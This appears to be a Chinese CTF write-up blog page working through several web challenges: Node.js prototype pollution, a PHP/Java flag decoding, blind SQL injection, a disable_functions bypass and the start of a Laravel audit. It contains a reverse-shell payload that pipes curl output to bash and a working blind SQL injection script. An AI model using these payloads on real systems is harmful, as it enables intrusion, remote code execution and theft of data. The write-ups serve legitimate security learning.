<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.owner = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">write_note</span>(<span class="params">author, raw_note</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.note_list[(<span class="built_in">this</span>.num++).toString()] = &#123;<span class="string">&quot;author&quot;</span>: author,<span class="string">&quot;raw_note&quot;</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">get_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="built_in">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">edit_note</span>(<span class="params">id, author, raw</span>)</span> &#123;</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">get_all_notes</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">remove_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="built_in">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">&quot;nobody&quot;</span>, <span class="string">&quot;this is nobody&#x27;s first note&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Notebook&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/add_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;please use POST to add a note&#x27;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;add note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;did not add note&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/delete_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to delete a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete done&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">&#x27;Sorry cant find that!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">&#x27;Something broke!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单审计一下，我们可以在<code>add_note</code>路由下post增加note，然后可以修改、删除等，然后可以在<code>status</code>路由下执行命令，那么我们想做的不就是想把<code>commands</code>数组里面的内容改成我们想执行的命令然后造成任意命令执行嘛</p>
<p>那么我们最终想要污染的点就是在<code>status</code>了</p>
<p><a href="https://xz.aliyun.com/t/10032#toc-12">https://xz.aliyun.com/t/10032#toc-12</a></p>
<p>说明在<code>edit_note</code>方法中的<code>undefsafe(this.note_list, id + &#39;.author&#39;, author);</code>可以利用，我们将object进行污染，加上我们想要执行的命令，而<code>commond</code>作为object的子类就会被污染</p>
<p>直接上payload：（这里因为exec是不会把结果返回出来的，所以直接反弹shell吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/edit_note</span><br><span class="line">post:</span><br><span class="line">id=__proto__&amp;author=curl your_ip/shell.txt|bash&amp;raw=123</span><br><span class="line"></span><br><span class="line">/status</span><br></pre></td></tr></table></figure>

<p>vps监听2333端口，成功反弹shell，没有任何阻碍直接拿到flag</p>
<h2 id="NPUCTF2020-web🐕"><a href="#NPUCTF2020-web🐕" class="headerlink" title="[NPUCTF2020]web🐕"></a>[NPUCTF2020]web🐕</h2><ul>
<li>水 诈骗</li>
<li>java字节码</li>
</ul>
<p>一开始是php，一看就能知道，如果可以只要先后执行一下<code>encrypt</code>和<code>decrypt</code>就能得到flag了，但是结果是1，显而易见是假的flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line">define(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="variable">$key</span>);    <span class="comment">//定义密钥</span></span><br><span class="line">define(<span class="string">&quot;IV&quot;</span>,<span class="string">&quot;6666666666666666&quot;</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line">define(<span class="string">&quot;BR&quot;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))header(<span class="string">&#x27;location:./index.php?source=1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span>(<span class="params"><span class="variable">$iv</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;--------encrypt---------&quot;</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;IV:&#x27;</span>.<span class="variable">$iv</span>.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt(<span class="variable">$data</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span>(<span class="params"><span class="variable">$iv</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode(<span class="variable">$data</span>),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,<span class="variable">$iv</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;False&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$iv</span> = IV;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$flag</span>;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt(<span class="variable">$iv</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&quot;decrypt&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$iv</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;iv&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt(<span class="variable">$iv</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我摊牌了，就是懒得写前端&quot;</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接看Java，本来说是要逆一下，但是直接用IDEA打开就好了</p>
<p>得到字节码数组，直接转一下就好啦（</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reByte</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] var10000 = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; var10000.length;i++) &#123;</span><br><span class="line">            System.out.print((<span class="keyword">char</span>) var10000[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><ul>
<li>利用PHP_SESSION_UPLOAD_PROGRESS自动执行session_start</li>
</ul>
<p><code>source.zip</code>直接下载</p>
<p>登录注册的入口都是从<code>index.php</code>进入的，可以发现<code>filter</code>中存在<code>addslashes</code>进行转义，而前面的几个遍历使得我们输入的数据都会把特殊字符给转义了，并且注册登录之后也没有重新查看个人信息的功能所以也不能进行二次注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SESSION</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_SESSION</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_GET</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_POST</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>): <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = filter(<span class="variable">$value</span>); <span class="keyword">endforeach</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    !is_string(<span class="variable">$value</span>) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addslashes(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>login.php</code>里面存在对session进行检测，如果session存在的话这个页面就可以正常访问，并且<code>login.php</code>是没有任何过滤的，所以可以构造<code>session</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Direct access on this script is not allowed!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/SopRomeo/article/details/108967248">https://blog.csdn.net/SopRomeo/article/details/108967248</a></p>
<blockquote>
<p>在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://fb2324f2-cbd8-44d9-a0f4-31ef9b64b509.node4.buuoj.cn:81/templates/login.php&#x27;</span></span><br><span class="line">file = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;12345678&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, files=file, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;123456789&#x27;</span>&#125;,</span><br><span class="line">                  cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;4459795494f0087578820b6bd1de07ff&#x27;</span>&#125;,</span><br><span class="line">                  params=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8081&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>直接开始跑脚本吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://fb2324f2-cbd8-44d9-a0f4-31ef9b64b509.node4.buuoj.cn:81/templates/login.php&#x27;</span></span><br><span class="line">file = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;12345678&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        left = <span class="number">31</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            time.sleep(<span class="number">0.05</span>)</span><br><span class="line">            payload = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;1&quot; or ascii(substr((select secret from flag_tbl),&#123;&#125;,1))&gt;&#123;&#125;#&#x27;</span>.<span class="built_in">format</span>(i, mid),</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">            r = requests.post(url,</span><br><span class="line">                              files=file,</span><br><span class="line">                              data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;123456789&#x27;</span>&#125;,</span><br><span class="line">                              cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;4459795494f0087578820b6bd1de07ff&#x27;</span>&#125;,</span><br><span class="line">                              params=payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Try&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;nonono&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># database = ptbctf</span></span><br><span class="line"><span class="comment"># table flag_tbl</span></span><br></pre></td></tr></table></figure>

<h2 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker_Easy"></a>Wallbreaker_Easy</h2><ul>
<li>bypass disable_function</li>
</ul>
<p>题目描述</p>
<blockquote>
<p>Imagick is a awesome library for hackers to break <code>disable_functions</code>.<br>So I installed php-imagick in the server, opened a <code>backdoor</code> for you.<br>Let’s try to execute <code>/readflag</code> to get the flag.<br>Open basedir: /var/www/html:/tmp/98e92802eccf20eabb854e0b716c9db8<br>Hint: eval($_POST[“backdoor”]);</p>
</blockquote>
<h3 id="1-蚁剑"><a href="#1-蚁剑" class="headerlink" title="1.蚁剑"></a>1.蚁剑</h3><p>直接蚁剑利用插件绕过<code>disable_functions</code></p>
<p><img src="https://img-blog.csdnimg.cn/291f014d14a84d278e741035aae28fd8.png" alt="image-20220623140930254"></p>
<p><img src="https://img-blog.csdnimg.cn/98178f652d824b5ebc88d6717447563f.png" alt="image-20220623140942915"></p>
<h2 id="BSidesCF-2019-Mixer"><a href="#BSidesCF-2019-Mixer" class="headerlink" title="[BSidesCF 2019]Mixer"></a>[BSidesCF 2019]Mixer</h2><ul>
<li>密码</li>
</ul>
<p>不大会</p>
<p><a href="https://github.com/beerpwn/ctf/tree/master/2019/BSidesSF_CTF/web/mixer">https://github.com/beerpwn/ctf/tree/master/2019/BSidesSF_CTF/web/mixer</a></p>
<p><a href="https://blog.csdn.net/a3320315/article/details/104335989?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1">https://blog.csdn.net/a3320315/article/details/104335989?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1</a></p>
<h2 id="护网杯-2018-easy-laravel"><a href="#护网杯-2018-easy-laravel" class="headerlink" title="[护网杯 2018]easy_laravel"></a>[护网杯 2018]easy_laravel</h2><ul>
<li>php框架</li>
<li>简单的sql</li>
</ul>
<p>存在源，并且在<code>note</code>路由下存在sql注入，并且是几乎没有任何过滤</p>
<h3 id="0x01-简单审计"><a href="#0x01-简单审计" class="headerlink" title="0x01:简单审计"></a>0x01:简单审计</h3><p>先看几个<code>Controller</code></p>
<p>有登陆注册等，但是UploadController需要是admin才能访问，所以我们或许可以admin登录，而我们在<code>AdminMiddleware</code>中可以得到admin的邮箱<code>admin@qvq.im</code></p>
<p>那接下去就看看该怎么登录了</p>
<p>存在<code>ResetPasswordController</code>，所以我们或许可以通过这个修改admin的密码</p>
<p>简单跟进一下，可以发现reset需要获取token</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;validate(<span class="variable">$request</span>, <span class="keyword">$this</span>-&gt;rules(), <span class="keyword">$this</span>-&gt;validationErrorMessages());</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">$this</span>-&gt;broker()-&gt;reset(<span class="keyword">$this</span>-&gt;credentials(<span class="variable">$request</span>), <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$user</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;resetPassword(<span class="variable">$user</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$response</span> == Password::PASSWORD_RESET ? <span class="keyword">$this</span>-&gt;sendResetResponse(<span class="variable">$response</span>) : <span class="keyword">$this</span>-&gt;sendResetFailedResponse(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;token&#x27;</span> =&gt; <span class="string">&#x27;required&#x27;</span>, <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;required|email&#x27;</span>, <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;required|confirmed|min:6&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且在<code>2014_10_12_100000_create_password_resets_table.php</code>中可以发现有<code>password_resets</code>表，其中就有token，那么我们只要找到admin对应的token就好了，那么接下去就是想进行一个sql注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">up</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Schema::create(<span class="string">&#x27;password_resets&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">Blueprint <span class="variable">$table</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span>-&gt;string(<span class="string">&#x27;email&#x27;</span>)-&gt;index();</span><br><span class="line">        <span class="variable">$table</span>-&gt;string(<span class="string">&#x27;token&#x27;</span>)-&gt;index();</span><br><span class="line">        <span class="variable">$table</span>-&gt;timestamp(<span class="string">&#x27;created_at&#x27;</span>)-&gt;nullable();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

